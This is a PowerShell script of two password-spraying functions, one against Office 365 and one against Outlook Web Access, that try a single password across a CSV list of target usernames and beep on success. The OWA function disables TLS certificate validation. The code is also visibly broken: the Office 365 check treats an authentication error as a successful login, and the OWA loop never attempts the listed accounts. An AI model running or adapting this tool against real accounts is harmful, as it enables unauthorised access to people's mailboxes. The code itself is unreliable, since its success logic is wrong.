function Brute-365 {
  <#
    .SYNOPSIS
        Attempts to login to Office 365 accounts using the Azure PowerShell module
        Author: Steve Borosh (@424f424f)
        Required Dependencies: Azure PowerShell module containing "Connect-Msolservice". http://connect.microsoft.com/site1164/Downloads/DownloadDetails.aspx?DownloadID=59185
        Optional Dependencies: None
    .DESCRIPTION
        Using a csv with a header column of "Username", iterates through each user
        attempting to log into the Office 365 service. Note: at the time of writing
        this module, there is no default account lockout. However, system administrators
        may enable lockout thresholds. Has optional parameter to beep when a login is successful
    .EXAMPLE
        Brute-365 -csv .\targets.csv -Password "Winter2016!" -Beep
#>
  Param(
    [Parameter(Mandatory=$False)]
    [String]$csv,

    [Parameter(Mandatory=$False)]
    [String]$Username,

    [Parameter(Mandatory=$True)]
    [String]$Password = $Null,

    [Parameter(Mandatory=$False)]
    [Switch]$Beep
  )
  if (!$Username) {
    if (!$csv) {
      Write-Output "A username or CSV is required! Exiting.."
      Break
    }
    $usernames = Import-CSV $csv
    foreach($user in $usernames) {
      $username = $($user.Username)
      $secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
      $mycreds = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
      $connect = Connect-MsolService -Credential $mycreds
      if ($connect -contains 'Authentication Error') {
        Write-Output "Logon Successful for $username"
        if ($Beep) {
          [console]::beep(2000,500)
        }
      }
    } 
  } 
} 
  function Brute-OWA  {
      <#
    .SYNOPSIS
        Attempts to login to Outlook Web Access accountse
        Author: Gowdhaman Karthikeyan, Steve Borosh (@424f424f)
        Reference: https://blogs.technet.microsoft.com/meamcs/2015/03/06/powershell-script-to-simulate-outlook-web-access-url-user-logon/
        Required Dependencies: PowerShellv3
        Optional Dependencies: None
    .DESCRIPTION
        Using a csv with a header column of "Username", iterates through each user
        attempting to log into the Outlook Web Access. Note: at the time of writing
        this module, there is no default account lockout. Beware of account lockout!
        Has optional parameter to beep when a login is successful.
    .EXAMPLE
        Brute-OWA -csv .\targets.csv -Password "Winter2016!" -Beep
#>
  # https://blogs.technet.microsoft.com/meamcs/2015/03/06/powershell-script-to-simulate-outlook-web-access-url-user-logon/
  Param(

   [Parameter(Mandatory=$true)]
   [String]$URL,

   [Parameter(Mandatory=$true)]
   [String]$Domain,

   [Parameter(Mandatory=$false)]
   [String]$csv,

   [Parameter(Mandatory=$False)]
   [String]$Username,

   [Parameter(Mandatory=$true)]
   [String]$Password,

   [Parameter(Mandatory=$False)]
    [Switch]$Beep
  )

  #Initialize default values

  $Result = $False
  $StatusCode = 0
  $Latency = 0
  if (!$Username) {
    if (!$csv) {
      Write-Output "A username or CSV is required! Exiting.."
      Break
    }
    $usernames = Import-CSV $csv
    foreach($user in $usernames) {
      $username = $($user.Username)
      write-host "here" $username
    } 
  } 
  $Username = $Domain + "\" + $Username

  try {
  #########################
  #Work around to Trust All Certificates is is from this post

  add-type @"
      using System.Net;
      using System.Security.Cryptography.X509Certificates;
      public class TrustAllCertsPolicy : ICertificatePolicy {
          public bool CheckValidationResult(
              ServicePoint srvPoint, X509Certificate certificate,
              WebRequest request, int certificateProblem) {
              return true;
         }
     }
"@
  [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

  #Initialize Stop Watch to calculate the latency.
 
    
    Write-Output $username
    #Invoke the login page
    $Response = Invoke-WebRequest -Uri $URL -SessionVariable owa

    #Login Page – Fill Logon Form

    if ($Response.forms[0].id -eq "logonform") {
    $Form = $Response.Forms[0]
    $Form.fields.username= $Username
    $form.Fields.password= $Password
    $authpath = "$URL/auth/owaauth.dll"
    #Login to OWA
    $Response = Invoke-WebRequest -Uri $authpath -WebSession $owa -Method POST -Body $Form.Fields
    #SuccessfulLogin 
    if ($Response.forms[0].id -eq "frm") {
      #Retrieve Status Code
      $StatusCode = $Response.StatusCode
      # Logoff Session
      $logoff = "$URL/auth/logoff.aspx?Cmd=logoff&src=exch"
      $Response = Invoke-WebRequest -Uri $logoff -WebSession $owa
      #Calculate Latency
      $Result = $True
    }
    #Fill Out Language Form, if it is first login
    elseif ($Response.forms[0].id -eq "lngfrm") {
      $Form = $Response.Forms[0]

      #Set Default Values
      $Form.Fields.add("lcid",$Response.ParsedHtml.getElementById("selLng").value)
      $Form.Fields.add("tzid",$Response.ParsedHtml.getElementById("selTZ").value)

      $langpath = "$URL/lang.owa"
      $Response = Invoke-WebRequest -Uri $langpath -WebSession $owa -Method $form.Method -Body $form.fields
      #Retrieve Status Code
      $StatusCode = $Response.StatusCode
      # Logoff Session
      $logoff = "$URL/auth/logoff.aspx?Cmd=logoff&src=exch"
      $Response = Invoke-WebRequest -Uri $logoff -WebSession $owa
      $Result = $True
    }
    elseif ($Response.forms[0].id -eq "logonform") {
      #We are still in LogonPage
      #Retrieve Status Code
      $StatusCode = $Response.StatusCode
      #Calculate Latency
      $Result = "Failed to logon $username. Check the password or account."
    }
  }
}
    #Catch Exception, If any
  catch
  {
    #Retrieve Status Code
    $StatusCode = $Response.StatusCode
    if ($StatusCode -notmatch '\d\d\d') {$StatusCode = 0}
    $Result = $_.Exception.Message
  }
  Write-Output "Result: $Result"
  if ($Result -notcontains "Failed") {
    if ($Beep) {
          [console]::beep(2000,500)
        }
  }
} 
